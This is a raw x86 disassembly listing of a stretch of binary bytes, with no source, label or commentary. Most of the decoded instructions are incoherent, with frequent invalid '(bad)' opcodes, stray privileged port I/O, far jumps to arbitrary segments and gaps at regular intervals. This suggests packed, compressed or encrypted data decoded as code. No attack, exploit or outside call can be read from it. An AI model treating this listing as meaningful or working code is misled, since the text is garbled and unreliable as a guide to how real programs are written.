  426e49:	inc    edi
  426e4a:	popa   
  426e4b:	fs stc 
  426e4d:	es out 0x3a,al
  426e50:	jmp    0x2825:0x162350a1
  426e57:	sub    DWORD PTR [ebx+0x39c0bcb9],ebp
  426e5d:	stc    
  426e5e:	mov    ds:0x2f90fe6c,al
  426e63:	mov    dl,0x6f
  426e65:	(bad)  
  426e66:	push   eax
  426e67:	cmp    BYTE PTR [esi-0x3852e89c],ah
  426e6d:	out    dx,al
  426e6e:	dec    ebp
  426e6f:	ins    BYTE PTR es:[edi],dx
  426e70:	inc    edi
  426e71:	mov    ds:0x27a802c7,eax
  426e76:	pop    es
  426e77:	iret   
  426e78:	mov    al,ds:0x8b134adb
  426e7d:	cmp    ebx,esp
  426e7f:	mov    WORD PTR [edx-0x3a],ds
  426e82:	jmp    0x5473:0xa3e4fab2
  426e89:	retf   
  426e8a:	test   BYTE PTR [esi],dh
  426e8c:	outs   dx,DWORD PTR ds:[esi]
  426e8d:	jo     0x426eaf
  426e8f:	xchg   esp,eax
  426e90:	popa   
  426e91:	xchg   ebp,eax
  426e92:	sub    BYTE PTR [ebx],dh
  426e94:	jmp    0x426e77
  426e96:	popf   
  426e97:	mov    bl,0x72
  426e99:	mov    ebp,edi
  426e9b:	xor    BYTE PTR [edx],0xed
  426e9e:	es push ebp
  426ea0:	rol    BYTE PTR [ecx-0x33],cl
  426ea3:	hlt    
  426ea4:	icebp  
  426ea5:	lds    ecx,FWORD PTR [ebx+0x22]
  426ea8:	mov    esi,0xe9e54c89
  426ead:	mov    al,ds:0xd8b6c7f6
  426eb2:	dec    edi
  426eb3:	je     0x426ebd
  426eb5:	ss mov ebx,0x311cc2a9
  426ebb:	repz jno 0x426f38
  426ebe:	and    eax,0x31a60cf5
  426ec3:	je     0x426ee6
  426ec5:	scas   eax,DWORD PTR es:[edi]
  426ec6:	test   eax,0x2a002e3e
  426ecb:	ds into 
  426ecd:	pop    edx
  426ece:	rcr    BYTE PTR [esi],cl
  426ed0:	scas   al,BYTE PTR es:[edi]
  426ed1:	mov    cl,0xed
  426ed3:	and    dh,dh
  426ed5:	mov    bl,0xa8
  426ed7:	fstp   QWORD PTR [esi-0x31]
  426eda:	popf   
  426edb:	pop    ds
  426edc:	in     al,0x6f
  426ede:	push   esp
  426edf:	mov    ?,esp
  426ee1:	push   0xffffff80
  426ee3:	xchg   edx,eax
  426ee4:	mov    edi,0x89c1df4e
  426ee9:	dec    esp
  426eea:	mov    dl,BYTE PTR [ebp-0x3c]
  426eed:	cdq    
  426eee:	sub    eax,DWORD PTR [edx+eax*2+0x21]
  426ef2:	sbb    ch,BYTE PTR [edi]
  426ef4:	lods   eax,DWORD PTR ds:[esi]
  426ef5:	jns    0x426ef6
  426ef7:	cmp    ebx,DWORD PTR [eax]
  426ef9:	ins    DWORD PTR es:[edi],dx
  426efa:	dec    esi
  426efb:	or     ah,BYTE PTR [ebx+0xd66d62f]
  426f01:	inc    edi
  426f02:	jbe    0x426f70
  426f04:	and    dl,dl
  426f06:	mov    ebx,0x3d3e5d88
  426f0b:	jo     0x426f73
  426f0d:	sahf   
  426f0e:	ret    0xb5
	...
  426f71:	add    BYTE PTR [eax],al
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [edx+esi*8+0x8fcd8df],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	add    eax,0x9468d99c
  426f91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f92:	(bad)
  426f96:	dec    ebp
  426f97:	fwait
  426f98:	bound  ebx,QWORD PTR ds:0xb1901a0c
  426f9e:	out    dx,eax
  426f9f:	or     BYTE PTR [ecx],dl
  426fa1:	leavew 
  426fa3:	xchg   esi,eax
  426fa4:	(bad)  
  426fa5:	clc    
  426fa6:	xchg   edx,eax
  426fa7:	mov    esp,0xc0751091
  426fac:	pop    esp
  426fad:	rol    ebx,0x74
  426fb0:	repz shl BYTE PTR [ebp-0x62],cl
  426fb4:	ret    0x92e9
  426fb7:	pushf  
  426fb8:	scas   al,BYTE PTR es:[edi]
  426fb9:	(bad)  
  426fbb:	outs   dx,DWORD PTR ds:[esi]
  426fbc:	adc    eax,0xd366c93b
  426fc1:	pop    ss
  426fc2:	mov    al,ds:0x646e5dcb
  426fc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fc8:	aaa    
  426fc9:	xchg   ecx,eax
  426fca:	jg     0x426f72
  426fcc:	mov    WORD PTR [ebx+0x1e],ds
  426fcf:	lods   al,BYTE PTR ds:[esi]
  426fd0:	jl     0x426fec
  426fd2:	push   eax
  426fd3:	je     0x426fd2
  426fd5:	dec    ebp
  426fd6:	or     DWORD PTR [eax+0x65],ebp
  426fd9:	je     0x426f8b
  426fdb:	nop
  426fdc:	sub    al,0x7c
  426fde:	loopne 0x426fc7
  426fe0:	les    edx,FWORD PTR [ecx-0x36]
  426fe3:	mov    ebp,eax
  426fe5:	inc    esi
  426fe6:	repz jnp 0x426fdd
  426fe9:	push   ds
  426fea:	inc    esp
  426feb:	out    0xd4,eax
  426fed:	jno    0x42703a
  426fef:	pop    ebp
  426ff0:	jo     0x427008
  426ff2:	mov    BYTE PTR [eax+ebx*8-0x3f],ah
  426ff6:	xchg   edi,eax
  426ff7:	adc    al,BYTE PTR [ecx]
  426ff9:	inc    ecx
  426ffa:	push   ss
  426ffb:	fld    TBYTE PTR [ebp-0x5f2ecf78]
  427001:	mov    bh,0x75
  427003:	adc    eax,0x43212779
  427008:	xor    ecx,ecx
  42700a:	out    dx,al
  42700b:	dec    esi
  42700c:	pop    ds
  42700d:	push   eax
  42700e:	ds cmp cl,0xbe
  427012:	dec    edx
  427013:	mov    al,0x2f
  427015:	(bad)  
  427016:	icebp  
  427017:	jb     0x427043
  427019:	out    0x73,al
  42701b:	xor    ah,BYTE PTR [edi-0xf]
  42701e:	sub    BYTE PTR [edx+0x48],0x71
  427022:	sub    al,0x88
  427024:	push   ss
  427025:	inc    esp
  427026:	mov    ch,0x35
  427028:	shl    DWORD PTR [eax-0x1d],0x18
  42702c:	dec    esp
  42702d:	cwde   
  42702e:	xor    DWORD PTR [esp+edi*2+0x7e753e76],esp
  427035:	mov    eax,DWORD PTR ds:0x59c58d95
  42703b:	imul   edx,esi,0x1f31a2fb
  427041:	xchg   BYTE PTR [eax+0x2cd0ae5d],ch
  427047:	and    BYTE PTR [eax-0x58],0x89
  42704b:	jp     0x426fe9
  42704d:	mov    dl,0x42
  42704f:	into   
  427050:	push   es
  427051:	xchg   BYTE PTR ds:[ecx+0x75],al
  427055:	lods   eax,DWORD PTR ds:[esi]
  427056:	adc    al,BYTE PTR [edi]
  427058:	mov    ebx,0x9b40eb4
  42705d:	jg     0x426ff3
  42705f:	es mov eax,0xf356b622
  427065:	fdiv   DWORD PTR [ebx]
  427067:	popa   
  427068:	(bad)  
  427069:	out    dx,al
  42706a:	sbb    DWORD PTR [eax-0x463f3186],esp
  427070:	jp     0x4270c5
  427072:	cs (bad) 
  427074:	pop    ecx
  427075:	cld    
  427076:	icebp  
  427077:	test   DWORD PTR [ecx+0x24],0xb3724807
  42707e:	call   0x9b54:0x206f6d35
  427085:	dec    edi
  427086:	and    ecx,DWORD PTR [esi]
  427088:	lahf   
  427089:	icebp  
  42708a:	out    dx,al
  42708b:	and    al,0xe6
  42708d:	cmp    ebx,DWORD PTR [ecx+0x12]
	...
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x2bbf9d96
  427102:	pop    eax
  427103:	xor    al,0xc
  427105:	mov    eax,ds:0x1040001
  42710a:	add    BYTE PTR [eax],al
  42710c:	and    bl,ah
  42710e:	jnp    0x427133
  427110:	mov    es,WORD PTR [ebx-0x5c]
  427113:	push   eax
  427114:	iret   
  427115:	fdiv   DWORD PTR [ecx-0x3e7541b]
  42711b:	shl    BYTE PTR [esi-0x5bdfc4e9],cl
  427121:	repnz mov bl,0x55
  427124:	sbb    esi,edi
  427126:	lods   al,BYTE PTR ds:[esi]
  427127:	fcomp  QWORD PTR [edi-0x41]
  42712a:	adc    ch,BYTE PTR [eax]
  42712c:	js     0x427119
  42712e:	rcr    BYTE PTR [esi+esi*1-0x6a6ff98c],cl
  427135:	add    DWORD PTR [ebx*1+0xd88b3ce],ebx
  42713c:	push   ecx
  42713d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42713e:	retf   0x7d8b
  427141:	shl    DWORD PTR [ebp+ebx*2+0x56],0x49
  427146:	cs popa 
  427148:	out    dx,eax
  427149:	sub    ecx,DWORD PTR [ebp+0x52ef6789]
  42714f:	xchg   edi,eax
  427150:	repnz xchg esp,eax
  427152:	cmp    BYTE PTR [esi+edx*2+0x4a89e4a2],cl
  427159:	mov    esi,0xe8c3479b
  42715e:	leave  
  42715f:	dec    ebp
  427160:	cld    
  427161:	cmp    ecx,DWORD PTR [edx+0xc5cb64e]
  427167:	mov    bh,0x74
  427169:	xchg   DWORD PTR es:[esi+ebp*2],eax
  42716d:	outs   dx,BYTE PTR ds:[esi]
  42716e:	es jl  0x427141
  427171:	mov    eax,0xfa488dd
  427176:	out    dx,eax
  427177:	fs ret 
  427179:	push   0x78
  42717b:	and    esp,DWORD PTR [ebp-0x70]
  42717e:	ja     0x427155
  427180:	popa   
  427181:	scas   eax,DWORD PTR es:[edi]
  427182:	jge    0x42710f
  427184:	and    ah,BYTE PTR [edx-0x7c465f21]
  42718a:	je     0x427173
  42718c:	push   ss
  42718d:	or     DWORD PTR [eax-0x48341fd5],eax
  427193:	sbb    eax,DWORD PTR [eax]
  427195:	xchg   DWORD PTR [esi+0x13aecfca],esi
  42719b:	adc    ecx,ebp
  42719d:	(bad)  
  42719e:	aam    0xb8
  4271a0:	dec    esi
  4271a1:	out    dx,al
  4271a2:	(bad)  
  4271a3:	mov    bh,0x9a
  4271a5:	sub    ah,BYTE PTR [eax]
  4271a7:	aaa    
  4271a8:	in     al,dx
  4271a9:	shr    esi,1
  4271ab:	jmp    0xaf7e:0x519dee32
  4271b2:	or     ecx,esi
  4271b4:	pop    edi
  4271b5:	jno    0x4271ac
  4271b7:	xchg   ebx,eax
  4271b8:	adc    esp,ebx
  4271ba:	xor    cl,BYTE PTR [esi]
  4271bc:	aas    
  4271bd:	nop
  4271be:	dec    esi
  4271bf:	je     0x933dd449
  4271c5:	dec    esi
  4271c6:	sti    
  4271c7:	sub    eax,0x918c79bf
  4271cc:	in     eax,dx
  4271cd:	lock sub BYTE PTR ds:0x6a1dc5cd,ah
  4271d4:	or     BYTE PTR [esi-0x5f],bh
  4271d7:	mov    esi,0x6b6a8323
  4271dc:	xor    edx,0x27b95a41
  4271e2:	(bad)  
  4271e4:	cwde   
  4271e5:	in     eax,dx
  4271e6:	inc    ebp
  4271e7:	sbb    al,0x3b
  4271e9:	jg     0x4271b9
  4271eb:	jns    0x42720e
  4271ed:	sbb    al,0x83
  4271ef:	mov    al,ds:0x5f009511
  4271f4:	std    
  4271f5:	xor    cl,BYTE PTR [edx]
  4271f7:	xchg   esi,eax
  4271f8:	loop   0x427233
  4271fa:	out    dx,eax
  4271fb:	out    dx,al
  4271fc:	xchg   esp,eax
  4271fd:	ds inc ebx
  4271ff:	or     al,0x18
  427201:	mov    BYTE PTR [ecx+0x5f5654a4],dl
  427207:	(bad)  
  427208:	data16 mov al,ds:0xb2d8d8aa
  42720e:	in     al,dx
  42720f:	imul   eax,DWORD PTR [eax],0x0
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x99053664,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	jle    0x4272e6
  42728e:	push   esi
  42728f:	adc    eax,0x81372517
  427294:	outs   dx,DWORD PTR ds:[esi]
  427295:	mov    al,ds:0xcc83470f
  42729a:	(bad)  
  42729b:	clc    
  42729c:	stos   DWORD PTR es:[edi],eax
  42729d:	lock cmc 
  42729f:	xchg   BYTE PTR [eax],dl
  4272a1:	retf   0x6aa5
  4272a4:	cmp    al,0xfe
  4272a6:	sbb    eax,0xb05c6f71
  4272ab:	inc    edi
  4272ac:	adc    eax,0x6af3ed2a
  4272b1:	aas    
  4272b2:	scas   eax,DWORD PTR es:[edi]
  4272b3:	mov    edx,0x42040c4e
  4272b8:	mov    ebp,edx
  4272ba:	pop    ecx
  4272bb:	(bad)  
  4272bc:	(bad)  
  4272bd:	sbb    bh,dh
  4272bf:	dec    ebp
  4272c0:	(bad)  
  4272c1:	lahf   
  4272c2:	ins    DWORD PTR es:[edi],dx
  4272c3:	scas   al,BYTE PTR es:[edi]
  4272c4:	mov    edx,eax
  4272c6:	cdq    
  4272c7:	sbb    ch,BYTE PTR [eax-0x4a]
  4272ca:	mov    edx,0xbaacb6b3
  4272cf:	in     eax,dx
  4272d0:	xchg   DWORD PTR [edx],ecx
  4272d2:	cwde   
  4272d3:	push   eax
  4272d4:	nop
  4272d5:	jo     0x4272b4
  4272d7:	fld    DWORD PTR [edx+0x33]
  4272da:	mov    edx,0x74928666
  4272df:	inc    edi
  4272e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4272e1:	add    DWORD PTR [ebp+0x4994fa9d],ebx
  4272e7:	mov    bl,0xc6
  4272e9:	sub    eax,0xda067962
  4272ee:	not    DWORD PTR [esi]
  4272f0:	scas   eax,DWORD PTR es:[edi]
  4272f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272f2:	sub    BYTE PTR [edx],ah
  4272f4:	adc    bh,bh
  4272f6:	ins    DWORD PTR es:[edi],dx
  4272f7:	psubd  mm0,QWORD PTR [edi]
  4272fa:	sbb    al,0xb2
  4272fc:	sbb    DWORD PTR [ecx],ebp
  4272fe:	jnp    0x4272d8
  427300:	and    edx,DWORD PTR [ebx-0x2a]
  427303:	sbb    dl,BYTE PTR [ebx+0x2a]
  427306:	neg    DWORD PTR [ebx+ebx*1-0x656da4ee]
  42730d:	or     al,0xdd
  42730f:	fist   DWORD PTR [edi+0x4559f98b]
  427315:	stos   BYTE PTR es:[edi],al
  427316:	ficom  DWORD PTR [ecx-0x24]
  427319:	test   DWORD PTR [ecx-0x4afae6b0],edi
  42731f:	adc    al,0xc7
  427321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427322:	(bad)  
  427323:	and    BYTE PTR [ecx],bh
  427325:	adc    al,0x50
  427327:	(bad)  
  427328:	pop    esp
  427329:	mov    bl,0xde
  42732b:	xchg   ecx,eax
  42732c:	mov    dh,0x14
  42732e:	adc    bl,BYTE PTR [ecx]
  427330:	or     cl,BYTE PTR [eax-0x379eee84]
  427336:	scas   al,BYTE PTR es:[edi]
  427337:	add    esi,0xffffff8a
  42733a:	add    BYTE PTR [esi-0x2e],cl
  42733d:	ja     0x427317
  42733f:	shr    DWORD PTR [esi-0x699cf67f],cl
  427345:	aam    0xa6
  427347:	sti    
  427348:	mov    cl,0x82
  42734a:	pop    esi
  42734b:	jb     0x427376
  42734d:	inc    BYTE PTR ds:0xa1e39f17
  427353:	xchg   esi,eax
  427354:	sub    bh,cl
  427356:	aad    0x7d
  427358:	and    dh,BYTE PTR [ecx+ecx*2+0x32bfd997]
  42735f:	xchg   esp,eax
  427360:	push   ecx
  427361:	inc    esi
  427362:	lock mov WORD PTR cs:[ebx],?
  427366:	add    BYTE PTR [ebx+0x79],dh
  427369:	adc    DWORD PTR [ebx+0x7343802a],edi
  42736f:	repz test DWORD PTR [edi],0x156527b6
  427376:	xchg   edx,eax
  427377:	dec    edi
  427378:	push   ebx
  427379:	sbb    edx,DWORD PTR [ecx-0x1d]
  42737c:	enter  0x98eb,0xcd
  427380:	cmc    
  427381:	inc    esi
  427382:	fisubr WORD PTR [ecx+0x2d]
  427385:	xor    BYTE PTR [edx],bh
  427387:	sbb    eax,0xa036dfc2
  42738c:	inc    ecx
  42738d:	stos   BYTE PTR es:[edi],al
  42738e:	aad    0x9f
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    ebx,DWORD PTR [edi+0x14fe9a18]
  427405:	mov    ds:0x1040001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	repnz push ecx
  42740e:	in     al,0x68
  427410:	aaa    
  427411:	cwde   
  427412:	dec    ebp
  427413:	xor    dl,bl
  427415:	and    BYTE PTR [edx],cl
  427417:	adc    DWORD PTR [ecx-0x33],0x39
  42741b:	outs   dx,BYTE PTR ds:[esi]
  42741c:	sub    esp,esp
  42741e:	(bad)  
  427420:	nop
  427421:	inc    ecx
  427422:	aad    0xeb
  427424:	lahf   
  427425:	fst    st(2)
  427427:	icebp  
  427428:	(bad)  
  427429:	sbb    BYTE PTR [eax+0x12945b84],ch
  42742f:	rcl    BYTE PTR [eax-0x237ebb6b],cl
  427435:	enter  0xa71c,0x9c
  427439:	mov    esi,DWORD PTR [ebx]
  42743b:	out    dx,eax
  42743c:	ret    0xc86b
  42743f:	jle    0x42742d
  427441:	inc    edx
  427442:	pop    esp
  427443:	xor    ecx,edi
  427445:	dec    edi
  427446:	cmp    eax,0x54942fcd
  42744b:	sar    esi,0x60
  42744e:	sub    edi,DWORD PTR [edx+0x1347e5aa]
  427454:	inc    ecx
  427455:	loopne 0x42748f
  427457:	adc    esp,edi
  427459:	rcl    DWORD PTR [ecx+eax*4+0x1c4a004f],1
  427460:	inc    edi
  427461:	xchg   ecx,eax
  427462:	mov    ch,0x1f
  427464:	les    edi,FWORD PTR [ebp-0x51cdddf9]
  42746a:	jge    0x4274af
  42746c:	dec    ebp
  42746d:	add    al,0x33
  42746f:	dec    cx
  427471:	lahf   
  427472:	fimul  DWORD PTR [ebx+0x57]
  427475:	ds inc edi
  427477:	xchg   esi,eax
  427478:	mov    ecx,0xe319ea89
  42747d:	test   ah,0x3
  427480:	mov    bl,0x7b
  427482:	mov    dl,0xf2
  427484:	adc    al,dh
  427486:	fldenv [edx-0x406cef45]
  42748c:	sub    DWORD PTR [edi+0x44187062],esi
  427492:	sub    al,0x42
  427494:	xor    dl,BYTE PTR [edi-0x23]
  427497:	jge    0x4274bd
  427499:	ins    BYTE PTR es:[edi],dx
  42749a:	jecxz  0x4274f9
  42749c:	shr    DWORD PTR [eax-0x52],0x15
  4274a0:	ds loop 0x4274f8
  4274a3:	xchg   ebx,eax
  4274a4:	shl    DWORD PTR [edx+0x46b27ce2],0xd
  4274ab:	out    dx,al
  4274ac:	jecxz  0x4274ba
  4274ae:	jb     0x427510
  4274b0:	dec    ebp
  4274b1:	jno    0x427490
  4274b3:	adc    DWORD PTR [ebx],edx
  4274b5:	and    esi,ebx
  4274b7:	out    0x38,eax
  4274b9:	cld    
  4274ba:	mov    BYTE PTR [ecx],bl
  4274bc:	add    al,ah
  4274be:	cmp    DWORD PTR [ecx-0x7d],esp
  4274c1:	jmp    0x427507
  4274c3:	bound  edi,QWORD PTR [esi-0x7109de1c]
  4274c9:	in     eax,0x5
  4274cb:	iret   
  4274cc:	dec    eax
  4274cd:	and    ebx,DWORD PTR [ecx-0x3a]
  4274d0:	jp     0x427480
  4274d2:	add    eax,0xe2ce0d0e
  4274d7:	mov    eax,0x39e3e3ca
  4274dc:	sbb    DWORD PTR [eax+esi*4-0x18],esi
  4274e0:	gs loopne 0x4274e6
  4274e3:	jle    0x42747a
  4274e5:	inc    edi
  4274e6:	cmp    DWORD PTR [ecx-0x67],esi
  4274e9:	push   ebx
  4274ea:	mov    bl,0xb5
  4274ec:	fiadd  DWORD PTR [esi-0xf]
  4274ef:	push   ebx
  4274f0:	aaa    
  4274f1:	mov    edi,0x5a450fbc
  4274f6:	ror    DWORD PTR [ecx-0x61],0x34
  4274fa:	ins    BYTE PTR es:[edi],dx
  4274fb:	nop
  4274fc:	cmc    
  4274fd:	lds    sp,DWORD PTR [ebp+0x44]
  427501:	mov    ebp,0x89bc21e2
  427506:	xchg   DWORD PTR [edi],edi
  427508:	xor    eax,0x158416e
  42750d:	hlt    
  42750e:	xor    BYTE PTR [esi+0x0],dl
	...
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	sbb    bl,al
  427582:	sahf   
  427583:	outs   dx,BYTE PTR ds:[esi]
  427584:	sbb    BYTE PTR [ecx+eax*1+0x10400],ah
  42758b:	add    BYTE PTR [esi+0x4a],cl
  42758e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42758f:	mov    dh,0x21
  427591:	ret    
  427592:	dec    esi
  427593:	hlt    
  427594:	sar    DWORD PTR [eax],cl
  427596:	pop    eax
  427597:	adc    al,BYTE PTR [ebx]
  427599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42759a:	xchg   edx,eax
  42759b:	xor    eax,0xc34cb1b
  4275a0:	xchg   ecx,eax
  4275a1:	inc    esp
  4275a2:	repnz sbb al,0x5a
  4275a5:	gs sahf 
  4275a7:	sub    eax,0x25c6d0c9
  4275ac:	mov    eax,0x94f4e3ba
  4275b1:	ret    0xc3dd
  4275b4:	cmp    bh,BYTE PTR [ecx+0x5b2eed35]
  4275ba:	mov    dl,0xae
  4275bc:	cli    
  4275bd:	mov    esi,0x2aa46279
  4275c2:	and    BYTE PTR [ecx-0x31],0x8a
  4275c6:	test   al,0xb8
  4275c8:	stc    
  4275c9:	pop    eax
  4275ca:	jb     0x427599
  4275cc:	cwde   
  4275cd:	mov    edx,DWORD PTR [ebp+0x69d6890f]
  4275d3:	push   cs
  4275d4:	lock in al,dx
  4275d6:	lahf   
  4275d7:	push   esp
  4275d8:	fs shl ch,1
  4275db:	jo     0x427623
  4275dd:	sub    esi,DWORD PTR [ebx]
  4275df:	test   DWORD PTR [esi],ebp
  4275e1:	test   eax,0x14f1e9d5
  4275e6:	iret   
  4275e7:	pop    ss
  4275e8:	cwde   
  4275e9:	sbb    eax,0x58b2691d
  4275ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275ef:	add    BYTE PTR [esi-0x20],ah
  4275f2:	arpl   WORD PTR [eax+ebp*4-0x68],di
  4275f6:	pop    edx
  4275f7:	addr16 adc al,dl
  4275fa:	inc    ebx
  4275fc:	jle    0x42762b
  4275fe:	cmp    dh,dl
  427600:	adc    DWORD PTR [esi+0x349f5b4e],ebp
  427606:	xchg   edx,eax
  427607:	fldenv [ebx-0x2a10fdd7]
  42760d:	pop    esp
  42760e:	mov    al,ds:0xf0857a91
  427613:	add    ecx,ecx
  427615:	pop    ss
  427616:	xchg   esi,eax
  427617:	cmc    
  427618:	push   edx
  427619:	adc    BYTE PTR [edx],bh
  42761b:	enter  0x7282,0xc4
  42761f:	fdiv   DWORD PTR [edi]
  427621:	int    0x1c
  427623:	scas   al,BYTE PTR es:[edi]
  427624:	xchg   ecx,eax
  427625:	mov    WORD PTR [edi],fs
  427627:	pop    edx
  427628:	mov    ds:0x47900d79,eax
  42762d:	mov    ecx,0x5ba5c84e
  427632:	aad    0xd6
  427634:	push   cs
  427635:	sbb    DWORD PTR [eax-0x2ca330d4],0xffffffb5
  42763c:	cmp    esi,ebx
  42763e:	adc    edx,DWORD PTR [esi+edi*1+0x31]
  427642:	cs leave 
  427644:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427645:	push   ss
  427646:	imul   ebx,ecx,0xffffff96
  427649:	sar    BYTE PTR ds:0x859fa218,0xf4
  427650:	inc    edi
  427651:	inc    ebx
  427652:	mov    esp,0x9480eed7
  427657:	fidivr DWORD PTR [ecx+0x701a1cad]
  42765d:	dec    ebp
  42765e:	jno    0x427663
  427660:	retf   
  427661:	xor    eax,0x408536ec
  427666:	mov    al,bl
  427668:	enter  0x1711,0x1c
  42766c:	push   esp
  42766d:	mov    ch,0x20
  42766f:	jno    0x427627
  427671:	ins    DWORD PTR es:[edi],dx
  427672:	iretw  
  427674:	xchg   edx,eax
  427675:	cs pop ss
  427677:	loopne 0x4275fd
  427679:	std    
  42767a:	jb     0x4276be
  42767c:	mov    dh,0xcc
  42767e:	retf   
  42767f:	and    DWORD PTR [ebp+0x44],0xffffff87
  427683:	leave  
  427684:	jg     0x4276b3
  427686:	ja     0x427620
  427688:	stos   BYTE PTR es:[edi],al
  427689:	sbb    eax,eax
  42768b:	call   DWORD PTR [eax+ebp*8+0xcb13]
	...
  4276f2:	add    BYTE PTR [eax],al
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fstp   DWORD PTR [ebp+0x1c77725e]
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    al,0x1
  42770a:	add    BYTE PTR [eax],al
  42770c:	mov    edx,cs
  42770e:	jecxz  0x427758
  427710:	dec    ebp
  427711:	adc    ebx,DWORD PTR [eax]
  427713:	fisubr DWORD PTR [esi]
  427715:	pop    edx
  427716:	add    DWORD PTR [edi+0x7a],esi
  427719:	jno    0x427759
  42771b:	std    
  42771c:	repnz or al,0xcd
  42771f:	xchg   edi,eax
  427720:	aaa    
  427721:	jl     0x4276e7
  427723:	repz jp 0x42770b
  427726:	test   eax,0xf7bccb68
  42772b:	inc    ebp
  42772c:	scas   al,BYTE PTR es:[edi]
  42772d:	xor    bh,BYTE PTR [ebp+0x53]
  427730:	xor    eax,0x5d69bb7a
  427735:	rol    BYTE PTR [ecx-0x74],cl
  427738:	in     al,dx
  427739:	repnz stos DWORD PTR es:[edi],eax
  42773b:	(bad)  
  42773c:	jmp    0x4276dd
  42773e:	rol    ebp,cl
  427740:	sub    eax,0xf7a94db3
  427745:	inc    edx
  427746:	xchg   edx,eax
  427747:	(bad)  
  427748:	popa   
  427749:	pop    ebp
  42774a:	repnz int3 
  42774c:	xor    al,0x62
  42774e:	(bad)  
  42774f:	cmp    ah,BYTE PTR [edx+0x1a81cd0b]
  427755:	xor    DWORD PTR [esi-0x51],0xd17c6581
  42775c:	mov    esi,0x8d5b97c9
  427761:	ret    
  427762:	es xchg edx,eax
  427764:	pop    es
  427765:	mov    al,0x50
  427767:	fcom   DWORD PTR [esi-0x4495754c]
  42776d:	jmp    0x9adc:0xd29872c5
  427774:	pop    ebp
  427775:	mul    BYTE PTR [ebx]
  427777:	shl    DWORD PTR [eax],0x6a
  42777a:	cmp    bh,BYTE PTR [ebp-0x34]
  42777d:	(bad)  
  42777e:	jle    0x42774c
  427780:	adc    ch,dh
  427782:	push   eax
  427783:	pop    esi
  427784:	hlt    
  427785:	cmp    al,0xa1
  427787:	jecxz  0x42776f
  427789:	inc    esi
  42778a:	jo     0x4277f4
  42778c:	popa   
  42778d:	shr    DWORD PTR [ebx],1
  42778f:	inc    eax
  427790:	ror    DWORD PTR [esp+ecx*8+0x5c],0x62
  427795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427796:	push   es
  427797:	xlat   BYTE PTR ds:[ebx]
  427798:	jge    0x427819
  42779a:	(bad)  
  42779c:	xchg   edx,eax
  42779d:	inc    edx
  42779e:	enter  0x46e6,0xda
  4277a2:	or     eax,0x7ccf87af
  4277a7:	mov    eax,ds:0x1e80512c
  4277ac:	pop    ebp
  4277ad:	sub    bh,dl
  4277af:	jne    0x42777c
  4277b1:	aam    0x3d
  4277b3:	dec    ebp
  4277b4:	pop    ecx
  4277b5:	aam    0xed
  4277b7:	rcl    BYTE PTR [edx+0x19],0x28
  4277bb:	into   
  4277bc:	mov    ebp,0xcceb63ff
  4277c1:	nop    esi
  4277c4:	sub    al,cl
  4277c6:	jae    0x4277d7
  4277c8:	out    dx,al
  4277c9:	daa    
  4277ca:	leave  
  4277cb:	jns    0x4277a9
  4277cd:	or     ah,cl
  4277cf:	lods   eax,DWORD PTR ds:[esi]
  4277d0:	xlat   BYTE PTR ds:[ebx]
  4277d1:	cmp    ah,BYTE PTR [edi]
  4277d3:	xor    BYTE PTR [esi-0x7e],dl
  4277d6:	or     al,0x30
  4277d8:	rcl    ebx,cl
  4277da:	loop   0x4277e1
  4277dc:	sbb    BYTE PTR [esi+0x41fc56ad],cl
  4277e2:	xchg   ecx,eax
  4277e3:	sbb    BYTE PTR [edx-0x2f],0x1e
  4277e7:	sbb    edx,edx
  4277e9:	inc    esp
  4277ea:	out    0x73,eax
  4277ec:	and    esi,DWORD PTR [edx+0x3ba109c4]
  4277f2:	(bad)  
  4277f3:	sbb    eax,eax
  4277f5:	nop
  4277f6:	ret    
  4277f7:	ja     0x4277c4
  4277f9:	pop    ds
  4277fa:	pop    eax
  4277fb:	sub    BYTE PTR [ebp+0x6c],ah
  4277fe:	shr    esi,cl
  427800:	ffree  st(6)
  427802:	pop    edi
  427803:	sub    al,0x49
  427805:	gs ret 
  427807:	fcmove st,st(1)
  427809:	iret   
  42780a:	or     cl,ch
  42780c:	aas    
  42780d:	dec    esp
  42780e:	rcl    ebp,cl
	...
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
